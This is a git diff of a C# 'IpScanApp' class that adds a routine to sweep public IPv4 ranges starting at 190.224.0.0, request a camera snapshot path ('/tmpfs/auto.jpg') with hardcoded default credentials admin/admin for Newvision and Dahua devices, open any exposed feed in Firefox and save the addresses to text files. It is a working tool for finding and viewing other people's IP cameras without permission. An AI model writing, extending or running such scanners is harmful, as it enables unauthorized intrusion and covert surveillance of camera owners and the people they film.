@@ -24,6 +24,7 @@ namespace IpScanApp.Clases
         IpAddress IpEnd = new IpAddress(Globals.IpEnd);
         public int Port = 80;
         public bool Stop = false;
+        public int TIMEOUT = 2000;
         public string Query { get; set; }
         public string Manufacturer { get; set; }
         public const string Jpeg = "image/jpeg";
@@ -57,7 +58,7 @@ namespace IpScanApp.Clases
                     {
                         string BaseUrl = "http://" + ipAddress;
                         RestClient client = new RestClient(BaseUrl);
-                        client.Timeout = 3000;
+                        client.Timeout = TIMEOUT;
                         client.FollowRedirects = false; //Cuando una petición devuelve una respuesta de tipo redirección, el cliente no la sigue automáticamente.
                         RestRequest request = new RestRequest(Query, Method.GET);
                         request.Credentials = Credentials; //solo newvision  
@@ -121,54 +122,55 @@ namespace IpScanApp.Clases
                         RequestPartialCount++;
                         string BaseUrl = "http://" + Ip + ":" + Port;
                         RestClient client = new RestClient(BaseUrl);
-                        client.Timeout = 3000;
+                        client.Timeout = TIMEOUT;
                         client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
                         RestRequest request = new RestRequest(Query, Method.GET);
                         request.Credentials = Credentials; //solo newvision  
                         IRestResponse response = client.Execute(request);
 
                         if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg  && response.ContentLength > 0)
-                        {
-                            Console.WriteLine(response.ResponseUri.Host + " " + Manufacturer);
-
+                        {                            
                             log.Info("Encontrado " + Manufacturer + " " + response.ResponseUri.Host + ":" + response.ResponseUri.Port.ToString());
+                            string ip = response.ResponseUri.Host;
 
-                            string FileName = Manufacturer + ".txt";
-                            if (File.Exists(FileName))
-                            {
-                                var file = File.ReadAllText(FileName);
+                            SaveIpAndPort(ip, Port, Manufacturer);
 
-                                if (!file.Contains(response.ResponseUri.Host))
-                                {
-                                    using (StreamWriter txt = new StreamWriter(FileName, true))
-                                    {
+                            //string FileName = Manufacturer + ".txt";
+                            //if (File.Exists(FileName))
+                            //{
+                            //    var file = File.ReadAllText(FileName);
 
-                                        if (Port == 80)
-                                        {
-                                            txt.WriteLine(response.ResponseUri.Host);
-                                        }
-                                        else
-                                        {
-                                            txt.WriteLine(response.ResponseUri.Host + ":" + Port);
-                                        }
-                                    }
-                                }
-                            }
-                            else
-                            {
-                                File.Create(FileName).Close();
-                                using (StreamWriter txt = new StreamWriter(FileName, true))
-                                {
-                                    if (Port == 80)
-                                    {
-                                        txt.WriteLine(response.ResponseUri.Host);
-                                    }
-                                    else
-                                    {
-                                        txt.WriteLine(response.ResponseUri.Host + ":" + Port);
-                                    }
-                                }
-                            }
+                            //    if (!file.Contains(response.ResponseUri.Host))
+                            //    {
+                            //        using (StreamWriter txt = new StreamWriter(FileName, true))
+                            //        {
+
+                            //            if (Port == 80)
+                            //            {
+                            //                txt.WriteLine(response.ResponseUri.Host);
+                            //            }
+                            //            else
+                            //            {
+                            //                txt.WriteLine(response.ResponseUri.Host + ":" + Port);
+                            //            }
+                            //        }
+                            //    }
+                            //}
+                            //else
+                            //{
+                            //    File.Create(FileName).Close();
+                            //    using (StreamWriter txt = new StreamWriter(FileName, true))
+                            //    {
+                            //        if (Port == 80)
+                            //        {
+                            //            txt.WriteLine(response.ResponseUri.Host);
+                            //        }
+                            //        else
+                            //        {
+                            //            txt.WriteLine(response.ResponseUri.Host + ":" + Port);
+                            //        }
+                            //    }
+                            //}
                         }
 
                         Ip = Ip.Increment(1);
@@ -193,93 +195,84 @@ namespace IpScanApp.Clases
         ///<summary>
         ///This method run async The Bot (Under Testing)
         ///</summary>
-        //public void RunAsync()
-        //{
-        //    //IpAddress Ip = IpStart;
+        public void RunAsyncNewvision()
+        {
+            IpAddress Ip = new IpAddress("190.224.0.0");
 
-        //    while (!Stop && Ip != IpEnd)
-        //    {
-        //        try
-        //        {
-        //            RequestCount++;
-        //            RequestPartialCount++;
+            while (!Stop)
+            {
 
-        //            //Console.WriteLine("Request " + RequestCount);
+                var IpEnd = Ip.Increment(255 * 5);
+                //List<IpAddress> Ips = new List<IpAddress>();
+                //Ips.Clear();
 
+                while (!Stop && Ip != IpEnd)
+                {
+                    //Ips.Add(Ip);
 
-        //            //Console.WriteLine(System.Net.ServicePointManager.DefaultConnectionLimit.ToString() + " Conexiones ");
-        //            string BaseUrl = "http://" + Ip + ":" + Port;
-        //            RestClient client = new RestClient(BaseUrl);
-                    
-        //            client.Timeout = 3000;
-        //            client.FollowRedirects = false; //Cuando una petición devuelve una respuesta de tipo redirección, el cliente no la sigue automáticamente.
-        //            RestRequest request = new RestRequest(Query, Method.GET);
-        //            request.Credentials = Credentials; //solo newvision    
-        //            client.ExecuteAsync(request, response =>
-        //            {
-        //                ResponseCount++;
-        //                //ShowActiveTcpConnections();
-        //                //Console.WriteLine("Response " + ResponseCount);
+                    try
+                    {
+                        string BaseUrl = "http://" + Ip;
+                        RestClient client = new RestClient(BaseUrl);
+                        client.Timeout = 4000;
+                        client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+                        RestRequest request = new RestRequest("/tmpfs/auto.jpg", Method.GET);
+                        request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
 
-        //                //if (response.StatusCode == System.Net.HttpStatusCode.OK)
-        //                //{
-        //                //    //OPEN BROWSER
-        //                //    Process.Start("http://" + response.ResponseUri.Host);
-        //                //}
-        //                if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg)
-        //                {
+                        client.ExecuteAsync(request, response =>
+                        {
+                            if (response.StatusCode == System.Net.HttpStatusCode.OK)
+                            {
+                                Console.WriteLine(response.ResponseUri.Host);
+                                IsNewvision(response.ResponseUri.Host);
+                            }
 
-        //                    //Console.WriteLine(res);
-        //                    //Console.WriteLine(Manufacturer + " " + response.ResponseUri.Host);
-        //                    string FileName = Manufacturer + ".txt";
+                            //if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
+                            //{
+                            //    //Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/cgi-bin/snapshot.cgi");
+                            //}
+                        });
 
-        //                    if (File.Exists(FileName))
-        //                    {                                
-        //                        var file = File.ReadAllText(FileName);
+                        Ip = Ip.Increment(1);
 
-        //                        if (!file.Contains(response.ResponseUri.Host))
-        //                        {
-        //                            using (StreamWriter txt = new StreamWriter(FileName, true))
-        //                            {
-        //                                if (Port == 80)
-        //                                {
-        //                                    txt.WriteLine(response.ResponseUri.Host);
-        //                                }
-        //                                else
-        //                                {
-        //                                    txt.WriteLine(response.ResponseUri.Host + ":" + Port);
-        //                                }
-        //                            }
-        //                        }
-        //                    }
-        //                    else 
-        //                    {
-        //                        if (Port == 80)
-        //                        {
-        //                            System.IO.File.WriteAllText(FileName, response.ResponseUri.Host);                                    
-        //                        }
-        //                        else
-        //                        {
-        //                            System.IO.File.WriteAllText(FileName, response.ResponseUri.Host + ":" + Port);                                    
-        //                        }                                                         
-        //                    }
-        //                }
-        //            });
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Source + " " + ex.Message);
+                    }
+                }
 
-        //            Ip = Ip.Increment(1);
+                //new Thread(() => Dahua(Ips)).Start();                
 
-        //            Thread.Sleep(50);
+                int count = 0;
 
-        //        }
-        //        catch (Exception ex)
-        //        {
-        //            Console.WriteLine(ex.Source + " " + ex.ToString());
-        //        }
-                
-        //    }
+                while (count < 50)
+                {
+                    Thread.Sleep(250);
+                    count++;
+                }
+            }
 
-        //    Console.WriteLine("DONE!");
-        //}
+            Console.WriteLine("DONE!");
+        }
+
+        private void IsNewvision(string Ip)
+        {
+            string BaseUrl = "http://" + Ip;
+            RestClient client = new RestClient(BaseUrl);
+            client.Timeout = 10000;
+            client.FollowRedirects = false; //Si una petición devuelve una respuesta de tipo redirección, no lo redirecciona a otra web.
+            RestRequest request = new RestRequest("/tmpfs/auto.jpg", Method.GET);
+            request.Credentials = new NetworkCredential("admin", "admin"); //solo newvision  & dahua
+
+            IRestResponse response = client.Execute(request);
+
+            if (response.StatusCode == System.Net.HttpStatusCode.OK && response.ContentType == Jpeg && response.ContentLength > 0)
+            {
+                Process.Start("firefox.exe", "http://admin:admin@" + response.ResponseUri.Host + "/tmpfs/auto.jpg");
+                SaveIpAndPort(response.ResponseUri.Host, response.ResponseUri.Port, "newvision");
+            }
+        }
 
         public Thread thRunInParallel { get; set; }
 
@@ -308,7 +301,52 @@ namespace IpScanApp.Clases
             
         }
 
-       
-    }
+        private void SaveIpAndPort(string ip, int port, string manufacturer)
+        {
+            try
+            {
+                string FileName = manufacturer + ".txt";
+                if (File.Exists(FileName))
+                {
+                    var file = File.ReadAllText(FileName);
 
+                    if (!file.Contains(ip))
+                    {
+                        using (StreamWriter txt = new StreamWriter(FileName, true))
+                        {
+
+                            if (Port == 80)
+                            {
+                                txt.WriteLine(ip);
+                            }
+                            else
+                            {
+                                txt.WriteLine(ip + ":" + Port);
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    File.Create(FileName).Close();
+                    using (StreamWriter txt = new StreamWriter(FileName, true))
+                    {
+                        if (Port == 80)
+                        {
+                            txt.WriteLine(ip);
+                        }
+                        else
+                        {
+                            txt.WriteLine(ip + ":" + Port);
+                        }
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+            
+        }       
+    }
 }
